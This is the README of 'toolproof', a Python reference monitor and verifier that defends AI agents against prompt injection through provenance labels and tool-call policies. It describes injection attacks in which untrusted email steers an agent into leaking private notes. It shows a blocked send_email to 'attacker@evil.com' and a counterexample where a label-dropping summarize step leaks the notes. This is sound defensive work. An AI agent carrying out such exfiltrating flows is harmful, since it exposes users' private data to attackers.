# toolproof

**Before you give an AI agent tools, find out whether your permission rules actually hold.**

Prompt injection turns "read my email" into "forward my notes to an attacker". The robust defence is not asking the model to behave; it is tracking *where data came from* and enforcing rules on every tool call, so that even a fully compromised model cannot break them. `toolproof` gives you both halves:

1. **A runtime monitor.** Every value carries a provenance label (which sources it derives from, and who may read it). Every tool call is checked against your policy before it runs, and every decision goes into a tamper-evident audit log.
2. **A verifier.** Policies are easy to get subtly wrong: a tool that forgets to pass labels along, a rule on `send_email` but not on the `forward_email` you added later. `toolproof verify` takes your tools, policy and safety invariants and **exhaustively searches every sequence of calls up to a depth that a worst-case planner could issue**, then prints the shortest sequence that breaks an invariant.

Pure Python 3.10+ standard library, no dependencies. Works with any agent framework because it only sees tool calls.

## Finding holes in a policy

`examples/email_assistant.json` describes an assistant with four tools (`read_email` returns attacker-controllable text, `read_notes` is private to Alice, `summarize`, `send_email`), two rules, and two invariants: *data derived from external email must never choose a recipient*, and *data derived from the notes may only be sent to Alice*.

```
$ toolproof verify examples/email_assistant.json --depth 4
explored 11788 states to depth 4; 4263 calls were blocked by the policy
no invariant violation found within this bound
holds within bound: no data derived from 'email:*' may reach *.to
holds within bound: data derived from 'notes' may leave through *.body only to ['alice@corp.com']
```

Now plant the classic mistake: `summarize` is configured not to pass its input's labels on (`"propagate": false`), so it launders the notes' provenance.

```
$ toolproof verify examples/bug_launders_taint.json --depth 4
VIOLATION: data derived from 'notes' may leave through *.body only to ['alice@corp.com']
  send_email.body carried data from notes to <user text>
  shortest sequence:
    1. read_notes()
    2. summarize(text=#2 [notes])
    3. send_email(to=#1 [user], body=#3 [tool:summarize])
```

The policy cannot see the secret in step 3 (the label says `tool:summarize`), but the verifier tracks true provenance independently and does. The same search catches a missing confidentiality rule, and, because invariants take glob patterns, a tool someone added later and forgot to cover (`forward_email` is found at depth 2). Exit code is 0 when the invariants hold within the bound, 1 when a violation is found or the search was truncated.

| depth | states explored | time |
|---|---|---|
| 3 | 1,296 | 0.05 s |
| 4 | 11,788 | 0.09 s |
| 5 | 110,368 | 0.57 s |

(The example above, 4 tools, on a laptop.) Search is breadth-first, so counterexamples are shortest, and identical states are merged.

## Runtime use

```python
from toolproof import Monitor, Tool, Policy, Integrity, Confidentiality, Confirm, Value

tools = [
    Tool("read_email", read_email, output_sources=("email:external",)),     # attacker-controllable
    Tool("read_notes", read_notes, output_sources=("notes",), output_readers=("alice@corp.com",)),
    Tool("summarize", summarize),                                           # labels propagate by default
    Tool("send_email", send_email),
]
policy = Policy([
    Integrity("send_email", "to", trusted=("user", "planner")),   # data from email can't pick the recipient
    Confidentiality("send_email", "body", recipient="to"),         # notes only go to people who may read them
    Confirm("delete_file"),                                        # a human approves this one
])
mon = Monitor(policy, tools, approver=ask_user, audit_path="audit.jsonl")

notes = mon.call("read_notes")                          # a Value: opaque, labelled
mon.call("send_email", to="alice@corp.com", body=notes) # allowed
mon.call("send_email", to="attacker@evil.com", body=notes)   # raises PolicyViolation
```

`Value` refuses `str()`, f-strings, `format`, `%`, `json.dumps` and iteration, so a label cannot be dropped by accident; use `Value.derive(fn, a, b)` to compute (the result carries the join of the labels) or `.data` to take raw data on purpose. For LLM planners, `mon.execute({...})` takes a JSON-style call whose arguments may be `{"$ref": "v3"}` handles, and returns only handles plus a metadata summary, so the planner model never reads untrusted or private data. `toolproof audit audit.jsonl` verifies the hash chain; the log stores labels, never raw data.

## The security model, honestly

What it gives you:
- **Policy enforcement independent of the model.** Rules are checked on labels, so a model that has been talked into anything still cannot send tainted data where the policy forbids it.
- **Conservative propagation.** Anything derived from several values carries all their sources and only the readers they all share. Tools propagate their inputs' labels to outputs unless you turn that off.
- **Verification of your configuration** against explicit invariants, with replayable counterexamples.

What it does not give you, so you can judge fit:
- **Labelling is your responsibility.** If a tool returns attacker-controllable text but you declare it trusted, nothing is protected. The verifier checks that your *policy* enforces your invariants given your *labels*; it cannot check that the labels are true.
- **The planner is a trusted source.** Literals the planner writes itself are allowed. That is sound only if the planner never reads untrusted content: give it handles (`mon.execute`), and route content that must be interpreted through a quarantined model with no tools.
- **Data flow only.** Information can still leak through control flow or side channels (which tools were called, how many times, timing). This is the same boundary noted for capability-based designs.
- **It does not judge content.** An allowed flow can still carry harmful text. It limits what an injection can *do*, not what it can *say*.
- **Verification is bounded.** "No violation found" holds for the modelled tools, the worst-case planner model in [docs/METHODS.md](docs/METHODS.md), and the stated depth; a truncated search says so. Run it at the depth of the longest chain of calls you care about.
- **Not a sandbox.** Use OS-level isolation for anything that can run code.

## Related work

The approach follows capability and information-flow ideas for agents, notably *Defeating Prompt Injections by Design* (CaMeL; [arXiv:2503.18813](https://arxiv.org/abs/2503.18813), code at [google-research/camel-prompt-injection](https://github.com/google-research/camel-prompt-injection)), which also enforces policy on tool calls using value provenance and readers. `toolproof` is not a reimplementation of that system's interpreter. It is a small, framework-agnostic reference monitor, plus the part I did not find as a ready-to-use tool: exhaustive verification of a concrete policy and tool configuration against stated invariants. Guardrail and agent-security frameworks exist alongside it; if you know of a tool that already does the verification step, please open an issue so it can be listed here.

## Development

```sh
PYTHONPATH=src python3 -m unittest discover -s tests -t . -v
PYTHONPATH=src python3 -m toolproof verify examples/email_assistant.json
```

The tests include scripted compromised-planner attacks that succeed with no policy and fail with it, a check that verifier counterexamples really succeed on the live monitor, a randomized comparison of live monitor walks against the invariants, and a mutation test in which the label logic is deliberately broken and the verifier is required to notice.

## License

MIT. See [LICENSE](LICENSE).
